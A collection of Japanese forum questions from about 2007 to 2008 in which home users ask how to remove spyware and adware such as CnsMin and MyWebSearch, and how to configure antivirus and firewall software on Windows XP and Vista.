ネットサーフィンをよくするので、スパイウェアー等が気になります。 あまり詳しいことはわからないのですが・・・ 現在はウイルスバスター２００８（月額版）を使用しています。 以前にエラー報告などで問題が多かったので、ウイルスバスターのファイアーウォールを無効にして、ウインドウズのファイアーウォールを使用しています。 一つだけでは？　ということを聞くので・・・ 常駐ソフト以外にフリーウェアなどをインストールしてもパソコンの動作に影響は出ないのでしょうか？ パソコンのスペックが高ければ問題はないと思うのですが、安価に購入したので、その辺が心配です。 以下はスペックです。 ウインドウズXP Service Pack 2 　　 Home Edition Version 2002 IE 6　（IE7にバージョンアップ後不具合のため戻しました） ウイルスバスター 2008　バージョン：16.05.1018 　　　　　　　　　　　　 エンジン：8.500.1002 　　　　　　　　　　　 　パターン：5.119.00 AMD Sempron（tm） Processor 3200+ 994 MHz 448 MB RAM 以上です。 ちなみに、皆様どのように対応しているのか、状況をお聞かせいただければ有り難いです。よろしくお願いします。
迷惑メールについて疑問に思ったのです。アダルトサイトに行った後は、エロＤＶＤの広告のメールがたくさん来て、「まぁこのくらいは誰でもあるな」と思っていたのですが、先日mixiの公式サイトに一度行っただけで加入を誘うメールがたくさん来ます。サイトの管理人は来た人のメルアドを自動的に入手できるとかも聞いたことがありますが、文面的にこれはスパイウェアでは無いかと思います。メールのほうの対策はもう大丈夫なのでスパイウェアがどこで入れられるのかやサイトの管理人が来た人のメルアドを自動で入手できる事の真偽について教えてください。 それと、ウィルスってexeやsrcを実行しない限り感染しないって本当ですか？
みなさん、教えて下さい。 裏芸能ニュース（動画）というブログらしきところに、「離婚！広末涼子に衝撃の事実！都内ラブホテルで・・。」とあり、嘘だろうと思って画像を見たところ、ホントに似ていたので、つい動画をクリックしてしまいました。 そして、何かの画面が出てきて、データ転送完了みたいなことが表示されました。 一瞬の間だったためよく分からないのですが、こんな感じでPC内のデーターが抜き取られることってありますか？ もし、あるのであれば私はどういう対策をしたら良いでしょうか？ とても気になりますので教えてください。 ちなみに私のPCにはウイルスバスター2007も入れていますが、何も反応はなかったです。 宜しくお願いいたします。
Jword関連で，CnsMin関連のゴミをレジストリから削除するため， Spybotを動かしてみたところ，同時に次が見つかりました。 １． Element C:\boot.exe ２． Microsoft.WindowsSecutiryCenter.AntiVirusOverride HKEY_LOCAL_MACHINE...................... ネット検索したところ，２は問題なさそうですが， １はよくわかりませんでした。唯一，情報として， W32.Elem.Trojanとして，symantecのHPに次の情報がありました。 The file C:\Boot.exe is a program which will reboot the system if it is executed. The file C:\Windows\Element.txt is a short text file which proclaims the Trojan to be the "ELEMENT" virus: ファイルのサイズについては，次のように書かれていました。 It may also create the files: C:\Boot.exe (12,288 bytes) C\Windows\Element.txt (594 bytes) C:\Windows\Element.ico (766 bytes) けれども私のc:\には，c:\boot.exeは存在しますが，バイト数が合いません。 また，C\Windows\Element.txtとC:\Windows\Element.icoは， 存在しませんでした。 ですので，このウィルスではないと思うのですが・・・。 c:\boot.exeというのはWindows\の正当な構成ファイルでしょうか？ 教えていただけると助かります。よろしくお願いします。
パソコンでインターネットをする際、はじめに出てくるＹａｈｏｏのページが文字化けのように中国語になってしまっています。 お気に入りに入れてるページは以前と変わりなく見ることができるのですが、最初のページだけは何度ひらいても同じ中国語のページになってしまいます 。 ゲームをダウンロードしたことが原因でないかと思っているのですが、どなたか解決法を知っていたら教えてください。お願いします。
ウィルスバスターにて、「TSPY_Adwaheck」というスパイウェアが検出されました。 危険度が「高」になっているのですが、削除をしてもまた検出されて、感染しているファイルを探しても見つからないという状態です。 また、このスパイウェアについての情報がネット上にほとんどありません。 ちなみに、これといった症状も今の所はありません。 このスパイウェアについての情報と、常に削除するという処理をして良いのか、若しくは別の対処をした方が良いのかを教えていただきたく質問しました。
ウインドウズセキュリティーセンターから警告がきています。 セキュリテーの重要項目の中で ファイアオール・・・有効　自動更新・・・・有効　ウイルス対策・・最新の状態ではありませんとでています。 現在ウイルスキラーを使用しています。ウイルスキラーは特に問題なくしよう出来ていますが、セキュリテーより警告が来るのはなぜでしょうか。 ※この警告は無視してよろしいのでしょうか。またどのように対処したらよいのでしょうか。よろしくお願いします。
UniteMovie ASFBinの入手方法 動画結合ソフトUniteMovieのAsfBin （コマンドライン版）の入手方法教えてください。RADIOACTIVE PAGESでのサイトが This Account Has Been Suspended Please contact the billing/support department as soon as possible. Site Hosted By: ANRHostになってました。 ANo.1 下記ページからダウンロード可能。 ​http://cowscorpion.com/dl/AsfBin.html​ McAfeeSiteAdviserで金色の表示がされました。
先日自分のノートパソコンにウィルスバスター２００８を入れて 無線LANでパソコンを楽しんでいるのですが 先日無線LANパトロールをしたところ ２０件以上の信頼されていないコンピューターが接続されていますと 検出されてしまいました IPアドレスはすべて６１から始まるアドレスだったのですが ところどころに「～～PC」など個人の名前が入った名前があったり 建設会社の名前があったりとわけがわかりません これはやはり検出されたということは不正に無線を使われて しまっているということでしょうか？ちなみに 無線LANの電源を抜いて有線でネット接続したときにも 同じように６１から始まるIPアドレスが数十件検出されるという 症状が起こっています。 なんだか気持ちが悪くてどうしていいのか困っています。 接続はCABLEです OSはビスタを使っています 対処法などありましたらどなたか教えていただけますか？ よろしくお願いします
こんばんは。 昨日、メールボックスを開きましたところ見覚えのないサイトから「ご登録ありがとうございます」と、メールが届いておりました。 インターネットを使用していればメールアドレスの盗用はある程度あるのかもしれませんが、心配でしたので一応は「Ad-Aware SE」にてスキャンしてみた所検出されたのは危険度低のクッキーだけでした。 （関係ありませんがアダルト系統ではなく教育系統からのメールだった事も心配を煽る原因になっているかもしれません） また、別のPCの事なのですが送信ファイルにとても重いメールが一通入ったままになっています。 重すぎるのかメールではなく別のファイルなのか分かりませんが30分放置しても送信完了になることはありません。また、削除もできません。 このPCはメールボックスを開く機会は2ヶ月に一度程度の上、こちらから送信した事は一度もありません。 しかし何故か「2007年5月3日」に「ragnarok013@msn（以降は不明）」に対し送信メールを送っています。 一体どうなっているのでしょうか？片方でもいいので教えていただければ幸いです。
２台のＰＣで業務用ソフトを会社別に分けて使用していましたが、片方のＰＣで不具合が生じインターネット接続ができなくなり修理の必要となりました。 修理に出す間、そのＰＣのソフトが使用できないのでもう一方のＰＣにインターネットによるシステム導入で対応することになりましたが、セキュリティが有効に働くと防御され消されてしまいます。システムをインストールするためには一旦セキュリティを無効にしないとできません。　然し、その都度セキュリティを無効にしたり有効にしたりでは不便極まりありません。 そこで質問ですが、このシステムだけ無効に（要は特定のシステムだけをインストールすることができるように）するにはどのような対応策があるかを教えて頂きたくよろしくお願いいたします。
ソース・ネクスト社のウィルスセキュリティーゼロを使用しています。 スタンバイの状態のＰＣが、やけに起き出すようになり、 あるとき、電源を切ろうとしましたら、 「別なユーザーがアクセスしています。」のような主旨の表示がなされました。 ファイアーウォールは設定しておりますし、 また、スパイウェアについては、頻繁にチェックしており、 現在までのところ、検知されたものはございません。 こうした外部からのアクセスを防ぐ方法をご存知の方、 ご教示いただけますと幸いに存じます。 どうぞ宜しくお願い申し上げます。
私はシャープのPC-AE50J （http://support.sharp.co.jp/mebius/menu/?mn=PC-AE …） を使っているのですが、JWordがプリインストールされていたせいで、 JWordをアンインストールした後も、スパイウェア対策ソフトで検索するとCnsMinが検出されます。 気持ち悪いのでCnsMinを完全アンインストールしたいのですが、そうできる無料のスパイウェア対策ソフトとかはあるでしょうか？ ちなみに私の方で使ったのは Ad-Aware 2007(http://www.download.com/Ad-Aware-2007/3000-8022_ …) とX-Cleaner free(http://www.shareedge.com/modules/shareware/view_ …) です。双方ともセーフモードで検索・削除しました。他にあれば、よろしくお願いします；；
OSはWinXPで、ソースネクストのウィルスセキュリティを使用しています。 ある日ツークリック詐欺に遭い、ここで対策を検索したら (幸いこの詐欺は無視したらOKな類のものでした) spybotの存在を知り、試してみると6個？のスパイウェアが検出されました。 全て削除したら不具合が出てしまったのです。 マイピクチャなどで、画像をダブルクリックすると 大きな画像が出て、下に次の画像や前の画像に移動できる矢印と、 削除や印刷のボタンが出てきていたのに、クィックタイムの インストールを勧める画面が出てきました。 クィックタイムはインストールしていたはずなのに、無効になったのかと思い 再度インストールしておきました。 今のところ、他に不具合は内容なのですがどうすれば 以前のような操作が出来るようになるのでしょうか？ パソコンの知識は自信がないです、、。 詳しい方、教えてください。お願いします。
ノートンインターネットセキュリティ2008（Ｗｉｎ-ＸＰ）利用者です。 よく、ソフトを立ち上げ時にセキュリティ警告がでて、 「どう処理しますか？」と聞かれ、 ・「このインスタンスを遮断する」 ・「常に許可する」 の選択を迫られます。 この場合、「常に遮断」などという選択肢はなく、毎回聞かれて厄介です。 「常に遮断」したい場合はどうすればいいのでしょうか？ よろしくお願いいたします。
トレンド・フレックス・オンラインスキャンをしていると、いつもみつかり、何度削除をしてもまた発見されてしまうのですが、このAdware_BHO_Mywayと言うものは駆除しなくても大丈夫なのでしょうか？ 概要を見ると大丈夫なような事も書いてあるので、あまり気にしないようにしていたのですが、やっぱり、心配になります。自力で駆除しようと思い、レジストリの値を一つ一つ調べても該当する値は見つかりませんでした。 もし、深刻なスパイウェアだとしたら、良い対処方法はあるでしょうか？よろしくお願いします。 対応方法: 　この検出はスパイウェア検出機能による検出です。不正プログラムではありませんので検出されても特に対応の必要はありません。このソフトウェアを意識的に使用しているなどで検出させたくない場合には製品のスパイウェア検出機能をオフにするなどしてご使用ください。検出されたプログラムが特に必要のないプログラムである場合には以下の手順でアンインストールしてください。 http://www.trendmicro.co.jp/vinfo/grayware/ve_gr …
Daemon toolsの新バージョンをインストールする際、余計なアドウエアのインストールをしないためにインストール時のチェックを外すステップが必要だったようなのですが、それをうっかり飛ばしてすべてインストールしてしまったため、スパイウエアをインストールしてしまいました。 これをこのままにしておくと、意図しない余計なアプリケーションを勝手にインストールされたりするようですし、InternetExplorerのホームページ設定もPCを起動するたびに勝手に「DAEMON 検索ホームへようこそ」なんていうページに書き換えられてしまうので困っています。 ウイルスバスターでスパイウエアの削除を試みたり、Daemon tools自体をアンインストールしたのですが、それでもうまく行かず、ホームページも毎回書き換えられてしまいます。 何か対策はないものでしょうか？ ご存知の方がいらっしゃいましたら、どうかよろしくお願いします。
backdoor.win32.small.cyb の削除方法を教えて下さい
今僕の、パソコンはWindows　Vistaをつかっています！ パソコンを使っていると、表示されていた画面やアイコン、スタートボタンがいきなりパッ！と消えて壁紙の画像とRunDLLと言うエラーメッセージが残りパソコンが動作しなくなります・・・ これって、スパイウェアのせいなのでしょうか、それともウイルスやその他の物せいなのでしょうか？ もし、対策などありあしたら教えてください！ お願いします！
急に右下のアイコンに http://proxy.f3.ymdb.yahoofs.jp/users/44b3bdfa_1 … このような警告とアイコンが出現しました。 文は PC has detected spyware infection. It is recomended to use special antispyware tools to pervent data loss. PC will now download and install the most up-to-date antispayware for you. Click here to protect your computer from spyware! http://www.higaitaisaku.com/fakewarning.html この方法を試しましたがまったく効果ありません。 この悪質スパイウェアを駆除できるソフトは他にありますか？ ちなみにウィルスバスター2007は入っています。 私のPCWindowsXPSP2です。 詳しい方よろしくおねがいします。
spybotの警告で重要なレジストリを変更しようとしています。と出てきました。見てみるとフラッシュプレイヤーのアップデートの関係で変更しようとしていると出ていました。僕はパソコンにあまり詳しくないので許可しませんでした。レジストリを変更するとどうなりますか？またこれはウイルスとかの可能性はありますか？何か知っていたら教えてください。
会社が私を辞めさせたがっているのですが、昨日から突然、勤務表(アクセス)を閉じようとするとPC本体(デスクトップ型)から、「ピン」と言う様な小さな音が鳴る様になりました。何か本社の方でパソコンのチェックなどをチェックされているのではないかと不安です。残業時間が多すぎるとの指摘を受けた事がある為、よけい気になります。（厳密に残業時間を。と言われたのですが、他の方の事についてははかなりルーズな会社です。私だけチェックして、辞めさせる口実にしたいのでは？と‥考えすぎでしょうか？)ちなみに他のアクセスのファイルではそんな事はありません。
64ビット vistaを使用しています。 送受信ができませんので、「ＺＥＲＯ」を無効にすると送受信できます 「ＺＥＲＯ」の設定項目が解りません。 ※メールソフト「windowsメール・shuriken2008」両方だめです。
現在、XP-SP2(Home)でnorton internet securityを使用しています。期限切れが近づいており購入しようか、どうしようかと迷っております。フリーソフトで結講役立つということもよく耳にします。スパイウエアとウイルスに対して有効なフリーソフトのお勧めはあるでしょうか？不具合が生じない場合、複数のソフトのインストールは可能なのでしょうか。書き込みを見ているとAVG、Ad-aware、Superanti-spywareなどが有名なのか目にします。ご教示よろしくお願い致します。
はじめまして。 先日オンラインスキャンをしていると、 スパイウェアが発見されました。 危険度　「中」　ということで、気持ちが悪いので除去または修復したいのですが、方法がわかりません。 Downloader "QQPass EV" found in key "hkey_current_user \software\tencent" http://ca.com/jp/securityadvisor/pest/pest.aspx? … 検出はComputer Associates eTrust PestPatrol の無料スパイウェア検出を使用しました。 ＯＳはwindows98で、アンチウィルスソフトは導入していません。 普段はいくつかの無料のオンラインスキャンを使用しています。 スパイウェアの除去に精通されている方、 ご回答よろしくお願いします。
毎度、アドバイスありがとうございます。1つ、質問させていただきます。私は、総合セキュリティソフト、kaspersky7.0を利用し、たまにトレンドマイクロ社のオンラインスキャンなどを、利用してます。 で、基本的に、kaspersky7.0が、他社ソフトとの併用は、サポート対象外と言っているのですが、スパイウェアー対策として、非常駐型のAd-Awareを、使ってみたいとも思っているのですが、非常駐型でも、競合は起きるのでしょうか？kasperskyを、信用していないわけではなく、ただ、スパイウェアー対策のみの観点から言えば、kasperskyよりもAd-Awareやspy-bot(?)など、専用ソフトのほうが、能力は高いと聞きました。どなたか、ご存知の方居れば、意見がいただければ幸いです。 宜しくお願いします。
SpywareTerminatorをインストールしたら、抱き合わせでアドウェアのCrawler Toolbarも入ってしまいました。 ウザいのでアンインストールしたいのですが、Terminatorの機能そのものに悪影響が出ることはないでしょうか。
フリーソフト紹介のサイトで、AVGAntispywareFreeEditionをインストールしてみたんですが英語表記でよく分かりません！！私的な質問ですが、検索エンジンで検索してもAntiVirusについての説明、紹介のサイトばかりです。御解答をお願いします。
質問する前に過去ログを捜したのですが探し方が下手なのか見つからなかったので質問させていただきました。 MessengerPlusLiveをインストールする際に広告もインストールしてしまい、2種類のポップアップが出るようになってしまいました。 ウィルスソフトでカスペルスキーを使用していますが、警報が出たのですが、気にせずに許可してしまいました。 ポップアップが気になったのでプログラムの追加と削除から広告のみをアンインストールして見たのですがポップアップが出るので Messenger自体すべてアンインストールして再度インストールし、Plusの方は広告をインストールせずにインストールしたのですがポップアップが出てしまいました。 これを削除したいのですがどうしたらよいでしょうか？？ご教授願います。
Ads Served by Dcadsを削除する方法を最後まで教えて下さい。（リカバリ以外で！）「Ads Served by Dcads」で検索し調べましたがどのサイトも同じ質問、回答のたらい回し。試してみても検知出来ても削除出来ていず、すぐ症状戻ります。実際に削除された方、有効な削除方法教えて下さい。
PC常駐セキュリティはマカフィーを使用しています。 最近PCが遅いのでスパイらしいということで フリーソフトSpybot-Search＆Destroyをダウンロードし スパイやワームウエアをPC内を調べると６つぐらい入っていました。 ５つは簡単に削除できたのですが、CnsMinだけは何回削除しても消えませんでした。 PC内では、このファイルにあることが判明したのですが、 場所は （SBI$9D2A5A9F）グローバルな設定 HKEY_USERS\S-1-5-21-850424502-997018365-2633104838-1008\Software\・・・ （SBI$F2486FF44）IE拡張 HKEY_LOOAL_MACHINE\Softwre\Intenet Explorer\AdvancedOptions\!・・・ の２箇所にファイルがあるようです。 これはファイルごと手作業で削除しても大丈夫でしょうか？ 詳しい方のアドバイスをお願いします。
に戻したいんですが、１．４の配布先教えてください。 1.5にする前削除しました。 低スペックではたまに動作がかなり重くなり、なぜかヤフーメール が開かないのが発生します。
初めての質問です。 先程、トレンドマイクロでオンラインスキャンをしたところ、"SPYWARE_TRAK_QUICK"というものが４つも検出されました。 たぶん削除出来たとは思うのですが、ネットで調べたところ全くヒットしなかったので、ご存知の方がいらしたら、どのような危険性があるのか教えていただけますでしょうか？ 何か情報が盗まれてしまったりしていないかとても心配しております。 （その他に、ADWARE_MEMWATCHERというものも検出されたのですが、これは調べたところ、心配なさそうだったので・・） それでは、どうぞよろしくお願いします。
ウィルスセキュリティを使っているのですが、パソコン立ち上げ時に、 Hostファイルが変更されました。変更した覚えがなければ、拒否をしてください」と言うメッセージが出てきて、一覧表で～は～へ接続しますと言うメッセージが長く表示され、ブロックか一括許可の選択をする警告がでました。 一応、ブロックしましたが、ウィルスセキュリティのウィルス自動探知機、システム防御が無効になっています。 シマンテックの無料のウィルス検査のみを実施しましたが、ウィルスの感染はなかったようです。 一体、どんな状況なのか、どういう対応をしたら良いのかパニックになってます。 良い対処ほうありますか？パソコンは全く無知に近いので何をどうすればいいのかわかりません。 よろしくお願いします
ウイルスバスターの有効期限が過ぎ、以前から変えたかったノートンの１５日間無料体験版をインストールしましたが、試用版の期限が切れたと出てしまいます。 プロダクトキーもメールに送られて来ていません。 ノートンのサポートセンターに電話しましたが土日は繋がりません。 アンインストールしてやり直しても同じでした。 ウイルスバスターの方が安いし３台使えるのでこのままウイルスバスターで更新しようかと思いますが、 ノートンのバックアップする新しい360　2.0バージョンが気になります。 バックアップはどのように行ってくれるのですか？ CDやDVDにバックアップしなくても良いと言う事ですか？ パソコンに関してはど素人なので、わかり易く説明してしていただける方宜しくお願い致します。 ※※質問内容※※※※※※※※※※※※※※※※※※※※※※※※※※ (1)何故、試用版の期限と出るのか？ (2)どうやったら体験版を使えるのか？ (3)ウイルスバスターとノートンどちらが良いか？ (4)ノートンもウイルスバスターのようにシリアル番号一つで３台のパソコンに対応出来るのか？ (5)ノートン360　2.0バージョンのバックアップはどのようの行われるのか？ ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
病院で勤務しておりまして、支給されたパソコン(Windouws Vista) で患者さんの個人データーを入力してあるのですが、今度、上司から インターネットを接続できるようにしてやるといわれているのですが インターネットを接続することによって、データの漏出につながるようなことがありますでしょうか。一応良くわからないのですがウイルスバスターを入れる予定ではありますが。これで大丈夫でしょうか
SpywareBlaster4.0をインストールするため、 古いソフトでディスエイブル→ソフト終了→追加と削除で削除→4.0ダウンロード spywareblastersetup40.exeをＷクリすると The setup files are corrupted.Please obtain a new copy of the program. と表示されインストールできません 再起動しても同じ現象です また、Spybot - Search & Destroyのアップデータを検索し、ダウンロードした際、インストール画面が出てきたのでとりあえず進めて行きましたら 再起動後、spybotsd152.exeがデスクトップに現れ、Spybot - Search & Destroyというショートカットも残ったままです 今後、何を使用すればよいのでしょうか？ コントロールパネルの追加と削除のところでも Spybot - Search & Destroyと Spybot - Search & Destroy 1.5.2.20の2種類がインストールされているようです 画面の右下のタスクバーに何やら常駐しています 右クリックすると起動から終了まで一連のメニューが表示されます
トレンドマイクロのオンラインスキャンを実施した際に、以下のスパイウェアが検出されました。 Adware_MemWatcher 普段はSpybot(Ver.1.5.2)とNorton Internet Security2007を使用しており、これらでは 感染ファイルは検出されませんでした。 トレンドマイクロのオンラインスキャンで検出された後、削除を実行しておりますが、 その後オンラインスキャンを再度実施すると、また同じスパイウェアが検出され削除できず困っております。 これを駆除する方法を教えてください。 よろしくお願いします。
Spybot - Search & Destroy 1.5.2をインストールしたいのですが、 よくインストールの仕方が良くわかりません；； いろんなサイトでインストールの仕方を検索したのですが、 現在のHPとは少し違うようで；； 初心者なのでなるべくわかりやすく教えてください。
avastを常駐させていますが（VISTAです）「マルウェアが発見されました」というアラームが2、3分ごとにでます。検出されるものはタイトルのとおりです。ネットで検索して、似たような事例をいろいろ試したのですがどうにもなりません。何度削除しても隔離しても延々と続いて困っております。場所は一時ファイルなので、インターネットオプションで全て削除したのですが同じことの繰り返しです。 もうavastをアンインストールする以外に方法はないでしょうか？ よろしくご教示ください。
Jetico Personal Firewallについての質問です。正直なところまったくの初心者でJetico Personal Firewallの解説サイトなので、理解できる範囲で設定をしています。 立ち上げる度に出る同じアラートに悩まされております。 googleDisktop.exeなど他にも何種類かあるのですが、 通常、初めて起動したアプリケーションでの設定の場合、テンプレートを利用がチェックできる場合は、チェックしてapplication Truseed Zoneを選択しています。 テンプレートをチェックできない場合は、カスタムを選択して処理をaccepeを選択しています。 上記の操作ではgoogleDisktop.exeなどは、起動するたびにJetico Personal Firewall処理方法のダイアログが表示されるのですが、どうすればいいでしょうか。 何卒宜しくお願いします。
Windows Defenderをダウンロードして「コンピューターを自動的にスキャンする（推奨）」にチェックをいれていますが、パソコンを立ち上げた時に確認しても最後にスキャンを実行した日が以前、手動でスキャンした日になってます。ちなみにスケジュールは毎日、午前2時に設定となってます。 自動スキャンに設定していてもその時刻にパソコンを使っていないとスキャンされないのでしょうか？ 初心者なものですいませんがよろしくお願いします
Windows　Live　Messegngerを開いただけでウイルスバスターにCookie_Atdmt　Cookie_207が検出されます　私のBlogを見に来てくれる人達に迷惑がかかっていないか心配です
完全にセキュアな環境を構築したいのですが、その ために質問したいことがいくつかあります。 まず、ルーターへの外部からのアクセスをすべて 拒否するような設定というのは可能でしょうか？ また、動的パケットフィルタリング機能がついている ルーターならば、こちらから外部にアクセスしない、 また、物理的に触られたりする心配がない、という 条件であるならば完全に安全と言えるでしょうか？ そのほかに、ルーターを直列につなぎ、安全度が あまり高くない環境と、完全にセキュアな環境 の２段の環境を作ることは技術的に可能でしょうか？ 最後に、動的パケットフィルタリングがついている、 という条件で通信のすべてをSSL通信で行い、その 暗号化強度が十分なものがあるとするならば、完全に 安全と言えるでしょうか？ 上記について、どうかよろしくお願いいたします。
Ad-aware SEでアップデートしようとしたのですが、 アップデートができませんでした。 これは、もうSEはもうアップーデートはできないと言う事でしょうか？ 2007しかアップデートは無理でしょうか？ 宜しくお願い致します。
　ウイルスのリアルタイム検索で「トロイの木馬型スパイウエアが検出されました。ウイルスバスターでは削除できないので、手動で次のレジストリーを削除してください。」との表示がありました。 　そこで、ファイル名を指定して実行からレジストリを検索したのですが、表示のようなレジストリは発見できませんでした。 　このような場合、どのように対処すうればよいのですか。
アンチスパイウェア・ファイアウォールを探しています。 現在「avast! 4 Home Edition 」を入れているのですが… 「avast! 4 Home Edition 」との相性が心配です。 アンチスパイウェアに『Spybot - Search & Destroy 1.5.2』を ファイアウォールに… 『ZoneAlarm』か『McAfee SiteAdvisor 2.6.0.6253』をと… 検討中なのですが・・・どうでしょうか？
　アダルトサイトに間違ってつないだら変なソフトをダウンロードされてパソコン起動時にアダルトサイトへの接続ソフトが自動的に起動するようになりました。この接続ソフトを消す方法が分かりません。 　家族で使うパソコンなので困っています。
SpywareBlaster3.5.1でアップデートしようとしたら"New Version of SpywareBlaster Available"と出たので3.5.1をアンインストールし4.0をインストールしました。 3.5.1ではオートアップデートは有料と聞いていたので、今回もマニュアルを選択しました。 これでよかったのでしょうか？
先日、PC Tools Firewall Plus v3.0.1.9をインストールをしました。 ウェブもメールも問題なく動作していると思ったのですが、 Fierfoxのアドオンの更新がエラーになってしまいました。 どうもアドオンについての通信を遮断しているようなのです。 アドオンの通信を許可する方法はありますでしょうか？
初めて質問させていただきます。 gzmrt.dllエラーが出ており、こちらのログも参考にさせていただいたのですがまたちょっと違う状態でしたので改めて質問させていただこうと思っております。 gzmrt.dllがウィルスバスター2007にスパイウェアとして隔離されている状態だったので、復元したら元通りになるのかと思い復元したのですが、またウィルスバスターからスパイウェアの危険性がある（危険度・高）と表示されたのでまた再隔離をしました。ついでに、スパイウェアの検索をした所、cookie関連のスパイウェアしか見つかりませんでした。 ウィルスバスターの通告を無視して、gzmrtを復元した方がいいのでしょうか？あまりパソコンに詳しくないので困っております。詳しい方はよろしければご回答よろしくお願い致します。
Tracking Cookieというスパイウェアに感染をしてしまいました。 最新のアップデートをしてノートンアンチウイルスの最新を導入して 毎朝、Ｗｉｎｄｏｗｓデフェンダーを起動させて十分に気をつけていました。 1週間に一度のフルスキャンをしたら今朝この様なスパイウェアが 発見されて大変なショックを受けています。 ノートンは常駐して監視をしているのに何故？進入を阻む事は 出来ないのですか？ 毎朝Ｗｉｎｄｏｗｓデフェンダーはチェックしていますけど 何の役にも立たないという事なのでしょうか？ 進入前に警告もしくは阻止をしないのでは高いお金を払って ノートンを購入した意味がまったくありません。 ＷｉｎｄｏｗｓＸＰ仕様でいかがわしいサイトは行っていません。 この手のウイルスには今の技術では防衛はしないのでしょうか？ どなたか分かり易い解説をお願い致します。
先日Rootkit Revealer をダウンロードして起動したところ、 HKLM\SECURITY\Policy\Secrets という領域で2つ検出しました。 双方とも詳細は"Key name contains embedded nulls (*)"で、タイムスタンプはパソコンを使い始める前の2004/08/10になっていました。 これは、誰かがセキュリティを書き換えて見つからないよう偽装したということなのでしょうか？ これらのファイルを削除する方法、また削除しても良いものなのでしょうか？ また、これらのファイルの内容を確認する方法はあるのでしょうか？ 現在入っているウイルス対策ソフトはウイルスバスターで、 頻繁に起動していますが、これらのファイルを検知したことはありません。 また、現在はリモートアシスタンスやリモートレジストリは切っていますが、結構長い間onの状態にありました。
Spybot1.5.2.20に先日Upした所、スキャンは最後まで出来るのですがそこでKERNEL32.DLLエラーとアラート表示、問題解決しない場合は再起動と出ます。先日回答頂いた通りにアンインストール、全てのSpybot関連のファイル等を検索削除しまして再インストールしたのですが、問題解決に至りません。同じ作業を何回か試みましたが問題に至りません。インストールのさいに英語版ヘルプファイル等英語表記のファイルを２つインストールしてないのですが、これが原因でしょうか？これから再インストール（全てのファイル）をして見ますが、事態が好転しない可能性も御座いますのでご意見・ご回答お願い致します。
会社のPCですが、フォルダを開くと マカフィーの『検出アラート（別ウィンドウ）』が立ち上がり、 検出：Adware-alexa アクション：実行されたアクションはありません オブジェクト:Alxtb2.dlll 場所:c:/Windows/System32 という画面がフォルダを開く度に、毎回毎回立ち上がります。 なにかに感染された感じではないのですが、毎回別ウィンドウが 立ち上がるので困っています。どのように対処すれば良いでしょうか。 但し、私はあまりPCのスキルがありませんので、分かり易い方法を 教えていただければ幸いです。
オーバーチュア広告で、会社が20万円投資で、60万円利益が出た そうなのですが、オーバーチュアでは費用対効果では よいほうなのでしょうか？ ちなみに物販系で、特産品のページです。 オーバーチュアでもアドセンスでも、いくら投資して 何万円利益が出たらとかの基準を知りたいです。 宜しくお願いします。
先ほどウイルスバスター2008でウイルス手動検索をしたところ、 ADWARE_BESTOFFERS と出ましたが、ファイルの情報を見るとどうも誤検出のようなのですが、どうなのでしょうか? 詳細な情報は、以下の通りです。 ウイルス・脅威名:Adware_BestOffers 種類:有害なブラウザクッキー ファイル名:Internet Explorer Cache 項目:zedo.com ブラウザクッキーということなのでどうなのかわかりませんが、危険性があるのですかね?
レジストリとかまったくわからなくて、、 これはすべてspybotからデリートしていいのでしょうか？ --- Search result list --- MyWay.MyWebSearch: インタフェース (レジストリキー　, nothing done) HKEY_CLASSES_ROOT\Interface\{3E720451-B472-4954-B7AA-33069EB53906} MyWay.MyWebSearch: インタフェース (レジストリキー　, nothing done) HKEY_CLASSES_ROOT\Interface\{3E720453-B472-4954-B7AA-33069EB53906} MyWay.MyWebSearch: Root class (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\MyWebSearch.HTMLPanel MyWay.MyWebSearch: Root class (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\MyWebSearch.HTMLPanel.1 MyWay.MyWebSearch: Class ID (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{3E720452-B472-4954-B7AA-33069EB53906} MyWay.MyWebSearch: Type library (レジストリキー　, nothing done) HKEY_CLASSES_ROOT\TypeLib\{3E720450-B472-4954-B7AA-33069EB53906} MyWay.MyWebSearch: 設定 (レジストリキー　, nothing done) HKEY_USERS\S-1-5-21-4203391296-1794996365-3246740190-1007\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{07B18EA1-A523-4961-B6BB-170DE4475CCA} MyWay.MyWebSearch: Class ID (レジストリキー　, nothing done) HKEY_CLASSES_ROOT\CLSID\{53CED2D0-5E9A-4761-9005-648404E6F7E5} MyWay.MyWebSearch: Root class (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\MyWebSearchToolBar.ToolbarPlugin MyWay.MyWebSearch: Root class (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\MyWebSearchToolBar.ToolbarPlugin.1 MyWay.MyWebSearch: Class ID (レジストリキー　, nothing done) HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{53CED2D0-5E9A-4761-9005-648404E6F7E5} NewDotNet: 実行可能 (ファイル, nothing done) C:\WINDOWS\NDNuninstall6_98.exe NewDotNet: 設定 (レジストリキー　, nothing done) HKEY_USERS\S-1-5-21-4203391296-1794996365-3246740190-1007\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{4A2AACF3-ADF6-11D5-98A9-00E018981B9E} PremiumSearch: 画像 (ファイル, nothing done) C:\Documents and Settings\ユーザ\Local Settings\Temp\c_header_spacer-1.gif PremiumSearch: 画像 (ファイル, nothing done) C:\Documents and Settings\ユーザ\Local Settings\Temp\c_header_spacer-2.gif PremiumSearch: 画像 (ファイル, nothing done) C:\Documents and Settings\ユーザ\Local Settings\Temp\c_header_spacer.gif PremiumSearch: 画像 (ファイル, nothing done) C:\Documents and Settings\ユーザ\Local Settings\Temp\null.gif PremiumSearch: 画像 (ファイル, nothing done) C:\Documents and Settings\ユーザ\Local Settings\Temp\spaceball.gif
SpywareTerminatorは常駐型だそうですが、他の常駐型セキュリティ・ソフト（NOD32、SpywareBlaster、Comodo）との併用は可能でしょうか。 WindowDefenderがなんとも非力なので、競合しないならばTerminatorに換えたいと思っております。すでにご使用の方、ご意見をいただけるとありがたく存じます。
IEに「puresafetyhere.com」というのが常駐してしまい、困っています。 以前YAHOOでも質問して、カスペルスキー（体験版）で駆除をしてみたのですが、IEのツールのなかに「IE　Anti-Spyware」の項目が張り付いています。アドレスバーも消えてしまい、何処へいったのやら・・・ （；＿；） 何か方法はありませんか？
